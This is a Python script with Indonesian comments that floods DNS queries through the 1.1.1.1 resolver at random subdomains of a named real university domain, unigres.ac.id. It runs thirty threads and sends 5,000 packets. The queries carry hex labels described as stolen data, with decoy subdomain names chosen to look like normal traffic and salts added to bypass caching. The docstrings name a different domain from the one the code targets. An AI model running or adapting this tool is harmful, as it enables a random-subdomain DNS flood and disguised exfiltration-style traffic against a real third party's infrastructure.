import socket
import binascii
import time
import sys
import random
import threading
import os
import string

# --- KONFIGURASI "NUCLEAR" (TARGET SPESIFIK) ---
DNS_SERVER = "1.1.1.1"       # Cloudflare
THREAD_COUNT = 30            # Saya turunkan ke 30 agar Mac Intel i5 Anda tidak freeze
PACKET_LIMIT = 5000          # Total paket

# --- KONFIGURASI TARGET ---
TARGET_DOMAIN = "unigres.ac.id"

# Subdomain palsu agar terlihat seperti trafik sistem yang wajar
FAKE_LABELS = ["api", "cdn", "update", "auth", "cloud", "v1", "www", "sys"]

# Counter Global (Thread Safe)
lock = threading.Lock()
sent_count = 0

def generate_target_suffix():
    """
    Membuat akhiran domain yang valid menuju drajatakbar.com
    Contoh output: "api.drajatakbar.com" atau "v1.drajatakbar.com"
    """
    # Kita pilih satu label palsu (misal: api)
    label = random.choice(FAKE_LABELS)
    # Tambahkan sedikit random string (salt) agar tidak kena cache DNS
    salt = ''.join(random.choices(string.ascii_lowercase, k=4))
    
    return f"{label}-{salt}.{TARGET_DOMAIN}"

def nuclear_flood(thread_id):
    global sent_count
    
    # Buka socket UDP
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return

    while True:
        with lock:
            if sent_count >= PACKET_LIMIT: break
            sent_count += 1
            current_count = sent_count 

        try:
            # 1. Generate Payload Hex (Data Rahasia yang dicuri)
            #    Setiap paket membawa potongan data acak 16 byte
            random_data = os.urandom(16) 
            hex_payload = binascii.hexlify(random_data).decode()
            
            # 2. Generate Domain Tujuan (Routing)
            #    Format: [HEX_DATA].[FAKE_SUB].[DRAJATAKBAR.COM]
            suffix = generate_target_suffix()
            full_domain = f"{hex_payload}.{suffix}"

            # 3. Rakit Paket DNS (Manual Packet Construction)
            #    Transaction ID (2 bytes) + Flags (Standard Query)
            query = os.urandom(2) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            
            # Encode Domain name (Length-prefixed)
            for part in full_domain.split('.'):
                query += bytes([len(part)]) + part.encode()
            query += b"\x00" # End of domain marker
            query += b"\x00\x01\x00\x01" # Type A, Class IN

            # 4. TEMBAK (FIRE)
            sock.sendto(query, (DNS_SERVER, 53))

            # Visualisasi (Print setiap 100 paket agar terminal tidak macet)
            if current_count % 100 == 0:
                sys.stdout.write(f"\r\033[91m[NUCLEAR FLOOD] Sent: {current_count}/{PACKET_LIMIT} >> Payload: {full_domain}\033[0m")
                sys.stdout.flush()
        
        except Exception:
            pass 
            
    sock.close()

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\033[41m\033[97m !!! WARNING: ACTIVATING NUCLEAR MODE (TARGETED) !!! \033[0m")
    print(f"[*] Target Root : {TARGET_DOMAIN}")
    print(f"[*] DNS Server  : {DNS_SERVER}")
    print(f"[*] Threads     : {THREAD_COUNT}")
    print("-" * 60)
    time.sleep(2) 

    start_time = time.time()
    
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=nuclear_flood, args=(i,))
        t.daemon = True 
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

    duration = time.time() - start_time
    if duration == 0: duration = 0.1 # Hindari division by zero
    pps = PACKET_LIMIT / duration

    print(f"\n\n\033[42m\033[97m[DONE] Sent {PACKET_LIMIT} Packets in {duration:.2f} seconds.\033[0m")
    print(f"\033[93m[STATS] Speed: {pps:.0f} Packets/Second (PPS)\033[0m")

if __name__ == "__main__":
    main()